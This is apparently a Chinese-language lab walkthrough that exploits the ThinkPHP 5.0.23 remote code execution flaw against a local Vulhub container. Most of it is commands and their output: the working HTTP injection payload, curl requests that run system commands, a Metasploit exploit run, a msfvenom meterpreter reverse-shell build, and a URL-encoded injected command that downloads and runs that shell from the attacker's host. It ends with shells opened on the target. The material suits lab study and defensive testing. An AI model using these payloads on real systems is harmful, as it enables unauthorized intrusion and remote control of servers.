这是一个rce远程代码执行漏洞
这个版本中的method的方法中没有正确处理方法名,导致攻击者可以调用Request类任意方法并构造利用链导致rce远程代码执行
应该是他们没有过滤或者过滤不严谨
rce漏洞就是我们不需要目标服务器账密 提交特定参数就可以在目标服务器执行任意的代码
我们利用这个可以实现发包和回显
我们要用到bp了
漏洞形式
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;
Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

先去加载镜像
[root@localhost ~]# cd /home
[root@localhost home]# docker load -i thinkphp-5.0.23.tar.gz 

ef68f6734aa4: Loading layer [==================================================>]  58.44MB/58.44MB
4572a80a7a5e: Loading layer [==================================================>]  3.584kB/3.584kB
abae6a338e5c: Loading layer [==================================================>]  213.5MB/213.5MB
96db4ce698ad: Loading layer [==================================================>]  3.584kB/3.584kB
9066d03e98e0: Loading layer [==================================================>]  43.04MB/43.04MB
e31bf34cfab9: Loading layer [==================================================>]  11.78kB/11.78kB
f2907ce42b47: Loading layer [==================================================>]  9.728kB/9.728kB
25ba5230dadf: Loading layer [==================================================>]   7.68kB/7.68kB
b4d5641bdce1: Loading layer [==================================================>]  13.49MB/13.49MB
457ddf1f777f: Loading layer [==================================================>]  4.096kB/4.096kB
1fb18fbf75b4: Loading layer [==================================================>]  57.53MB/57.53MB
2054983b5e45: Loading layer [==================================================>]  11.78kB/11.78kB
11e8ba18f9cc: Loading layer [==================================================>]  4.608kB/4.608kB
295592a971d5: Loading layer [==================================================>]  4.608kB/4.608kB
31cf9fbfe354: Loading layer [==================================================>]   1.69MB/1.69MB
251c3c026cec: Loading layer [==================================================>]  139.8kB/139.8kB
5b91bdba2a10: Loading layer [==================================================>]  3.584kB/3.584kB
f23b676085cb: Loading layer [==================================================>]   30.4MB/30.4MB
Loaded image: vulhub/thinkphp:5.0.23
[root@localhost home]# 
[root@localhost home]# dockerload -i solr-log4j2.tar.gz 
bash: dockerload: 未找到命令...
[root@localhost home]# docker load -i solr-log4j2.tar.gz 
f96222d75c55: Loading layer [==================================================>]  128.9MB/128.9MB
149636c85012: Loading layer [==================================================>]  45.18MB/45.18MB
0de9d866d419: Loading layer [==================================================>]  1.291MB/1.291MB
1be3b0873025: Loading layer [==================================================>]  3.584kB/3.584kB
133d54bcd235: Loading layer [==================================================>]  3.584kB/3.584kB
e4b690d9ba33: Loading layer [==================================================>]  141.1MB/141.1MB
c045569e5db3: Loading layer [==================================================>]    426kB/426kB
57251a65e60e: Loading layer [==================================================>]  246.8MB/246.8MB
3022761539e5: Loading layer [==================================================>]   2.56kB/2.56kB
5f70bf18a086: Loading layer [==================================================>]  1.024kB/1.024kB
Loaded image: vulhub/solr:8.11.0

之后启动一下
[root@localhost home]# unzip thinkphp.zip 
Archive:  thinkphp.zip
   creating: thinkphp/5.0.23-rce/
  inflating: thinkphp/5.0.23-rce/1.png  
  inflating: thinkphp/5.0.23-rce/README.md  
  inflating: thinkphp/5.0.23-rce/README.zh-cn.md  
  inflating: thinkphp/5.0.23-rce/docker-compose.yml  
[root@localhost home]# cd ./thinkphp/k
-bash: cd: ./thinkphp/k: 没有那个文件或目录
[root@localhost home]# cd ./thinkphp/
[root@localhost thinkphp]# cd 5.0.23-rce/
[root@localhost 5.0.23-rce]# ls
1.png  docker-compose.yml  README.md  README.zh-cn.md
[root@localhost 5.0.23-rce]# docker compose up -d
WARN[0000] /home/thinkphp/5.0.23-rce/docker-compose.yml: `version` is obsolete 
[+] Running 2/2
 ✔ Network 5023-rce_default  Created                                                                                  0.3s 
 ✔ Container 5023-rce-web-1  Started  

咱们直接用curl也好使
但是在shell命令行的时候数据需要加双引号
curl http://192.168.101.99:8080/index.php?s=captcha -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id" | head -n 1

┌──(root💀tyza66)-[~/Evil-Droid-master]
└─# curl http://192.168.101.99:8080/index.php?s=captcha -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id" | head -n 1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  7458    0  7386  100   uid=33(www-data) gid=33(www-data) groups=33(www-data)
 72   471k   4710 --:--:-- --:--:-- --:--:--  485k
curl: Failed writing body

gid=33(www-data) groups=33(www-data) 就是返回的信息

除了这种方式 我们还可以用bp直接发送数据包
bp就是一个修改数据包抓包工具

POST /index.php?s=captcha HTTP/1.1
Host: 192.168.101.99:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

复制进去 修改Host为靶场地址 请求即可 当然我们可以执行任何命令
POST /index.php?s=captcha HTTP/1.1
Host: 192.168.101.99:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 73

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=pwd

接下来我们想办法拿到反弹shell 啥的 更多的操作
我们先用msf弄一下 记得发的是什么payload就用什么payload接
┌──(root💀tyza66)-[~/Evil-Droid-master]
└─# msfdb run
[i] Database already started
Metasploit tip: After running db_nmap, be sure to check out the result 
of hosts and services
                                                  

*Neutrino_Cannon*PrettyBeefy*PostalTime*binbash*deadastronauts*EvilBunnyWrote*L1T*Mail.ru*() { :;}; echo vulnerable*
*Team sorceror*ADACTF*BisonSquad*socialdistancing*LeukeTeamNaam*OWASP Moncton*Alegori*exit*Vampire Bunnies*APT593*
*QuePasaZombiesAndFriends*NetSecBG*coincoin*ShroomZ*Slow Coders*Scavenger Security*Bruh*NoTeamName*Terminal Cult*
*edspiner*BFG*MagentaHats*0x01DA*Kaczuszki*AlphaPwners*FILAHA*Raffaela*HackSurYvette*outout*HackSouth*Corax*yeeb0iz*
*SKUA*Cyber COBRA*flaghunters*0xCD*AI Generated*CSEC*p3nnm3d*IFS*CTF_Circle*InnotecLabs*baadf00d*BitSwitchers*0xnoobs*
*ItPwns - Intergalactic Team of PWNers*PCCsquared*fr334aks*runCMD*0x194*Kapital Krakens*ReadyPlayer1337*Team 443*
*H4CKSN0W*InfOUsec*CTF Community*DCZia*NiceWay*0xBlueSky*ME3*Tipi'Hack*Porg Pwn Platoon*Hackerty*hackstreetboys*
*ideaengine007*eggcellent*H4x*cw167*localhorst*Original Cyan Lonkero*Sad_Pandas*FalseFlag*OurHeartBleedsOrange*SBWASP*
*Cult of the Dead Turkey*doesthismatter*crayontheft*Cyber Mausoleum*scripterz*VetSec*norbot*Delta Squad Zero*Mukesh*
*x00-x00*BlackCat*ARESx*cxp*vaporsec*purplehax*RedTeam@MTU*UsalamaTeam*vitamink*RISC*forkbomb444*hownowbrowncow*
*etherknot*cheesebaguette*downgrade*FR!3ND5*badfirmware*Cut3Dr4g0n*dc615*nora*Polaris One*team*hail hydra*Takoyaki*
*Sudo Society*incognito-flash*TheScientists*Tea Party*Reapers of Pwnage*OldBoys*M0ul3Fr1t1B13r3*bearswithsaws*DC540*
*iMosuke*Infosec_zitro*CrackTheFlag*TheConquerors*Asur*4fun*Rogue-CTF*Cyber*TMHC*The_Pirhacks*btwIuseArch*MadDawgs*
*HInc*The Pighty Mangolins*CCSF_RamSec*x4n0n*x0rc3r3rs*emehacr*Ph4n70m_R34p3r*humziq*Preeminence*UMGC*ByteBrigade*
*TeamFastMark*Towson-Cyberkatz*meow*xrzhev*PA Hackers*Kuolema*Nakateam*L0g!c B0mb*NOVA-InfoSec*teamstyle*Panic*
*B0NG0R3*                                                                                    *Les Cadets Rouges*buf*
*Les Tontons Fl4gueurs*                                                                      *404 : Flag Not Found*
*' UNION SELECT 'password*      _________                __                                  *OCD247*Sparkle Pony*                                        
*burner_herz0g*                 \_   ___ \_____  _______/  |_ __ _________   ____            *Kill$hot*ConEmu*                                            
*here_there_be_trolls*          /    \  \/\__  \ \____ \   __\  |  \_  __ \_/ __ \           *;echo"hacked"*                                              
*r4t5_*6rung4nd4*NYUSEC*        \     \____/ __ \|  |_> >  | |  |  /|  | \/\  ___/           *karamel4e*                                                  
*IkastenIO*TWC*balkansec*        \______  (____  /   __/|__| |____/ |__|    \___  >          *cybersecurity.li*                                           
*TofuEelRoll*Trash Pandas*              \/     \/|__|                           \/           *OneManArmy*cyb3r_w1z4rd5*                                   
*Astra*Got Schwartz?*tmux*                  ___________.__                                   *AreYouStuck*Mr.Robot.0*                                     
*\nls*Juicy white peach*                    \__    ___/|  |__   ____                         *EPITA Rennes*                                               
*HackerKnights*                               |    |   |  |  \_/ __ \                        *guildOfGengar*Titans*                                       
*Pentest Rangers*                             |    |   |   Y  \  ___/                        *The Libbyrators*                                            
*placeholder name*bitup*                      |____|   |___|  /\___  >                       *JeffTadashi*Mikeal*                                         
*UCASers*onotch*                                            \/     \/                        *ky_dong_day_song*                                           
*NeNiNuMmOk*                              ___________.__                                     *JustForFun!*                                                
*Maux de tête*LalaNG*                     \_   _____/|  | _____     ____                     *g3tsh3Lls0on*                                               
*crr0tz*z3r0p0rn*clueless*                 |    __)  |  | \__  \   / ___\                    *Phở Đặc Biệt*Paradox*                                       
*HackWara*                                 |     \   |  |__/ __ \_/ /_/  >                   *KaRIPux*inf0sec*                                            
*Kugelschreibertester*                     \___  /   |____(____  /\___  /                    *bluehens*Antoine77*                                         
*icemasters*                                   \/              \//_____/                     *genxy*TRADE_NAMES*                                          
*Spartan's Ravens*                       _______________   _______________                   *BadByte*fontwang_tw*                                        
*g0ldd1gg3rs*pappo*                     \_____  \   _  \  \_____  \   _  \                   *ghoti*                                                      
*Les CRACKS*c0dingRabbits*               /  ____/  /_\  \  /  ____/  /_\  \                  *LinuxRiders*                                                
*2Cr4Sh*RecycleBin*                     /       \  \_/   \/       \  \_/   \                 *Jalan Durian*                                               
*ExploitStudio*                         \_______ \_____  /\_______ \_____  /                 *WPICSC*logaritm*                                            
*Car RamRod*0x41414141*                         \/     \/         \/     \/                  *Orv1ll3*team-fm4dd*                                         
*Björkson*FlyingCircus*                                                                      *PwnHub*H4X0R*Yanee*
*Securifera*hot cocoa*                                                                       *Et3rnal*PelarianCP*
*n00bytes*DNC&G*guildzero*dorko*tv*42*{EHF}*CarpeDien*Flamin-Go*BarryWhite*XUcyber*FernetInjection*DCcurity*
*Mars Explorer*ozen_cfw*Fat Boys*Simpatico*nzdjb*Isec-U.O*The Pomorians*T35H*H@wk33*JetJ*OrangeStar*Team Corgi*
*D0g3*0itch*OffRes*LegionOfRinf*UniWA*wgucoo*Pr0ph3t*L0ner*_n00bz*OSINT Punchers*Tinfoil Hats*Hava*Team Neu*
*Cyb3rDoctor*Techlock Inc*kinakomochi*DubbelDopper*bubbasnmp*w*Gh0st$*tyl3rsec*LUCKY_CLOVERS*ev4d3rx10-team*ir4n6*
*PEQUI_ctf*HKLBGD*L3o*5 bits short of a byte*UCM*ByteForc3*Death_Geass*Stryk3r*WooT*Raise The Black*CTErr0r*
*Individual*mikejam*Flag Predator*klandes*_no_Skids*SQ.*CyberOWL*Ironhearts*Kizzle*gauti*
*San Antonio College Cyber Rangers*sam.ninja*Akerbeltz*cheeseroyale*Ephyra*sard city*OrderingChaos*Pickle_Ricks*
*Hex2Text*defiant*hefter*Flaggermeister*Oxford Brookes University*OD1E*noob_noob*Ferris Wheel*Ficus*ONO*jameless*
*Log1c_b0mb*dr4k0t4*0th3rs*dcua*cccchhhh6819*Manzara's Magpies*pwn4lyfe*Droogy*Shrubhound Gang*ssociety*HackJWU*
*asdfghjkl*n00bi3*i-cube warriors*WhateverThrone*Salvat0re*Chadsec*0x1337deadbeef*StarchThingIDK*Tieto_alaviiva_turva*
*InspiV*RPCA Cyber Club*kurage0verfl0w*lammm*pelicans_for_freedom*switchteam*tim*departedcomputerchairs*cool_runnings*
*chads*SecureShell*EetIetsHekken*CyberSquad*P&K*Trident*RedSeer*SOMA*EVM*BUckys_Angels*OrangeJuice*DemDirtyUserz*
*OpenToAll*Born2Hack*Bigglesworth*NIS*10Monkeys1Keyboard*TNGCrew*Cla55N0tF0und*exploits33kr*root_rulzz*InfosecIITG*
*superusers*H@rdT0R3m3b3r*operators*NULL*stuxCTF*mHackresciallo*Eclipse*Gingabeast*Hamad*Immortals*arasan*MouseTrap*
*damn_sadboi*tadaaa*null2root*HowestCSP*fezfezf*LordVader*Fl@g_Hunt3rs*bluenet*P@Ge2mE*



       =[ metasploit v6.4.9-dev                           ]
+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

search thimsf6 > search thinkphp

Matching Modules
================

   #  Name                              Disclosure Date  Rank       Check  Description
   -  ----                              ---------------  ----       -----  -----------
   0  exploit/unix/webapp/thinkphp_rce  2018-12-10       excellent  Yes    ThinkPHP Multiple PHP Injection RCEs                                           
   1    \_ target: Unix Command         .                .          .      .
   2    \_ target: Linux Dropper        .                .          .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/unix/webapp/thinkphp_rce                                                
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'                                                             

msf6 > info 0

       Name: ThinkPHP Multiple PHP Injection RCEs
     Module: exploit/unix/webapp/thinkphp_rce
   Platform: Unix, Linux
       Arch: cmd, x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2018-12-10

Provided by:
  wvu <wvu@metasploit.com>

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
      0   Unix Command
  =>  1   Linux Dropper

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:p
                                        ort[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://doc
                                        s.metasploit.com/docs/using-metaspl
                                        oit/basics/using-metasploit.html
  RPORT      8080             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing conn
                                        ections
  SSLCert                     no        Path to a custom SSL certificate (d
                                        efault is randomly generated)
  TARGETURI  /                yes       Base path
  URIPATH                     no        The URI to use for this exploit (de
                                        fault is random)
  VHOST                       no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface t
                                      o listen on. This must be an address
                                      on the local machine or 0.0.0.0 to li
                                      sten on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  This module exploits one of two PHP injection vulnerabilities in the
  ThinkPHP web framework to execute code as the web user.

  Versions up to and including 5.0.23 are exploitable, though 5.0.23 is
  vulnerable to a separate vulnerability. The module will automatically
  attempt to detect the version of the software.

  Tested against versions 5.0.20 and 5.0.23 as can be found on Vulhub.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2018-20062
  https://nvd.nist.gov/vuln/detail/CVE-2019-9082
  https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
  https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce


View the full module info with the info -d command.

msf6 > use 0
[*] Using configured payload linux/x64/meterpreter_reverse_tcp
msf6 exploit(unix/webapp/thinkphp_rce) > options

Module options (exploit/unix/webapp/thinkphp_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:
                                         port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://do
                                         cs.metasploit.com/docs/using-metas
                                         ploit/basics/using-metasploit.html
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing con
                                         nections
   SSLCert                     no        Path to a custom SSL certificate (
                                         default is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (d
                                         efault is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface
                                       to listen on. This must be an addres
                                       s on the local machine or 0.0.0.0 to
                                        listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may b
                                     e specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/thinkphp_rce) > set LHOST 182.168.101.53
LHOST => 182.168.101.53
msf6 exploit(unix/webapp/thinkphp_rce) > ser RHOST 192.168.101.99
[-] Unknown command: ser. Did you mean set? Run the help command for more details.
msf6 exploit(unix/webapp/thinkphp_rce) > ser RHOSTs 192.168.101.99
[-] Unknown command: ser. Did you mean set? Run the help command for more details.
msf6 exploit(unix/webapp/thinkphp_rce) > ser RHOSTS 192.168.101.99
[-] Unknown command: ser. Did you mean set? Run the help command for more details.
msf6 exploit(unix/webapp/thinkphp_rce) > seT RHOSTS 192.168.101.99
[-] Unknown command: seT. Did you mean set? Run the help command for more details.
msf6 exploit(unix/webapp/thinkphp_rce) > set RHOSTS 192.168.101.99
RHOSTS => 192.168.101.99
msf6 exploit(unix/webapp/thinkphp_rce) > run

[-] Handler failed to bind to 182.168.101.53:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. ThinkPHP 5.0.23 is a vulnerable version.
[*] Targeting ThinkPHP 5.0.23 automatically
[*] Using URL: http://182.168.101.53:8080/ffCZLdj7jeljp
[+] Successfully executed command: curl -so /tmp/shjFHurQ http://182.168.101.53:8080/ffCZLdj7jeljp;chmod +x /tmp/shjFHurQ;/tmp/shjFHurQ;rm -f /tmp/shjFHurQ
[*] Command Stager progress - 100.00% done (120/120 bytes)
[*] Server stopped.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/webapp/thinkphp_rce) > options

Module options (exploit/unix/webapp/thinkphp_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:
                                         port[,type:host:port][...]
   RHOSTS     192.168.101.99   yes       The target host(s), see https://do
                                         cs.metasploit.com/docs/using-metas
                                         ploit/basics/using-metasploit.html
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing con
                                         nections
   SSLCert                     no        Path to a custom SSL certificate (
                                         default is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (d
                                         efault is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface
                                       to listen on. This must be an addres
                                       s on the local machine or 0.0.0.0 to
                                        listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  182.168.101.53   yes       The listen address (an interface may b
                                     e specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/thinkphp_rce) > set LHOSTS 192.168.101.53
[!] Unknown datastore option: LHOSTS. Did you mean LHOST?
LHOSTS => 192.168.101.53
msf6 exploit(unix/webapp/thinkphp_rce) > set LHOST 192.168.101.53
LHOST => 192.168.101.53
msf6 exploit(unix/webapp/thinkphp_rce) > run

[*] Started reverse TCP handler on 192.168.101.53:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. ThinkPHP 5.0.23 is a vulnerable version.
[*] Targeting ThinkPHP 5.0.23 automatically
[*] Using URL: http://192.168.101.53:8080/nNMN8YhuFdoJym
[*] Client 192.168.101.99 (curl/7.52.1) requested /nNMN8YhuFdoJym
[*] Sending payload to 192.168.101.99 (curl/7.52.1)
[*] Meterpreter session 1 opened (192.168.101.53:4444 -> 192.168.101.99:48708) at 2025-02-18 10:03:02 +0800
[+] Successfully executed command: curl -so /tmp/IpvsnHpy http://192.168.101.53:8080/nNMN8YhuFdoJym;chmod +x /tmp/IpvsnHpy;/tmp/IpvsnHpy;rm -f /tmp/IpvsnHpy
[*] Command Stager progress - 100.00% done (121/121 bytes)
[*] Server stopped.

meterpreter > SHELL
[-] Unknown command: SHELL. Did you mean shell? Run the help command for more details.
meterpreter > shell
Process 66 created.
Channel 1 created.

pwd
/var/www/public
whoami
www-data

注意地址别打错 我这回打错好几次
ok了 拿到shell

接下来 用收哦的那个的方式搞一下
我们可以手动生成一个木马 之后手动输入一下

msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=192.168.101.53 lport=4444 -f elf -o /var/www/html/reverse_tcp_shell

┌──(root💀tyza66)-[~/Evil-Droid-master]
└─# 
msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=192.168.101.53 lport=4444 -f elf -o /var/www/html/reverse_tcp_shell

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1068672 bytes
Final size of elf file: 1068672 bytes
Saved as: /var/www/html/reverse_tcp_shell

这里传的是独立载荷 传输器载荷的话可以试一下 但是要保持一致
生成完直接放在apache目录了 方便拉取

之后我们在kali启动一个监听
┌──(root💀tyza66)-[~/Evil-Droid-master]
└─# msfdb run
[i] Database already started
Metasploit tip: Enable HTTP request and response logging with set HttpTrace 
true
                                                  

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        https://metasploit.com


       =[ metasploit v6.4.9-dev                           ]
+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exlpoit/multi/handler
[-] No results from search
[-] Failed to load module: exlpoit/multi/handler
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > ser payload linux/x64/meterpreter_reverse_tcp
[-] Unknown command: ser. Did you mean set? Run the help command for more details.
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
payload => linux/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.101.53
LHOST => 192.168.101.53
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.101.53:4444 
linux/x64/meterpreter_reverse_tcp

然后准备向靶机注入
curl http://192.168.101.99:8080/index.php?s=captcha -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=curl -so /tmp/reverse_tcp_shell http://192.168.101.53/reverse_tcp_shell;chmod +x /tmp/reverse_tcp_shell;/tmp/reverse_tcp_shell;rm -f /tmp/reverse_tcp_shell"

分号连接多个命令是顺序执行的
但是其实我们不能直接提交 这里面好多特殊符号 先url编码一下
curl http://192.168.101.99:8080/index.php?s=captcha -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=%63%75%72%6c%20%2d%73%6f%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%20%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%30%31%2e%35%33%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%63%68%6d%6f%64%20%2b%78%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%72%6d%20%2d%66%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c"

记得启动apache2服务器
┌──(root💀tyza66)-[~]
└─# systemctl start apache2                            
                                                                             
┌──(root💀tyza66)-[~]
└─# curl http://192.168.101.99:8080/index.php?s=captcha -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=%63%75%72%6c%20%2d%73%6f%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%20%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%30%31%2e%35%33%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%63%68%6d%6f%64%20%2b%78%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%72%6d%20%2d%66%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c"

之后这边就可以了
msf6 > use exlpoit/multi/handler
[-] No results from search
[-] Failed to load module: exlpoit/multi/handler
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > ser payload linux/x64/meterpreter_reverse_tcp
[-] Unknown command: ser. Did you mean set? Run the help command for more details.
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
payload => linux/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.101.53
LHOST => 192.168.101.53
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.101.53:4444 
linux/x64/meterpreter_reverse_tcp[*] Meterpreter session 1 opened (192.168.101.53:4444 -> 192.168.101.99:51678) at 2025-02-18 10:40:59 +0800

meterpreter > pwd
/var/www/public
meterpreter > 

因为我们是普通用户 下载到tmp目录才有权限



